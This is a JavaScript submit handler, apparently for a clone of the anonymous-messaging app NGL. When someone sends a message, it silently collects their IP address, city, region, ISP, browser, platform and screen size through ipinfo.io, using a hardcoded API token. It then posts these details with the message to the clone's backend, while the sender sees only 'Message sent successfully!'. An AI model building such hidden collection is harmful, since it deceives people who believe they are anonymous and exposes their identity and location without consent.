document.getElementById('messageForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const message = document.getElementById('message').value;
    const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
    const os = navigator.platform;
    const browser = navigator.userAgent;
    const screenSize = `${window.screen.width}x${window.screen.height}`;

    fetch(`https://ipinfo.io/json?token=27ff9607c05b9b`)
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            const city = data.city;
            const region = data.region;
            const ispName = data.org;
            const connectionType = 'WiFi';

            const payload = {
                message,
                device_type: deviceType,
                os,
                browser,
                screen_size: screenSize,
                city,
                region,
                isp_name: ispName,
                connection_type: connectionType,
                ip,
            };

            fetch('https://ngl-clone-backend-ochre.vercel.app/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    document.getElementById('responseMessage').textContent = 'Message sent successfully!';
                } else {
                    document.getElementById('responseMessage').textContent = 'Failed to send message. Please try again.';
                }
            })
            .catch(error => {
                document.getElementById('responseMessage').textContent = 'An error occurred. Please try again later.';
            });
        })
        .catch(error => {
            document.getElementById('responseMessage').textContent = 'Unable to retrieve IP details.';
        });
});
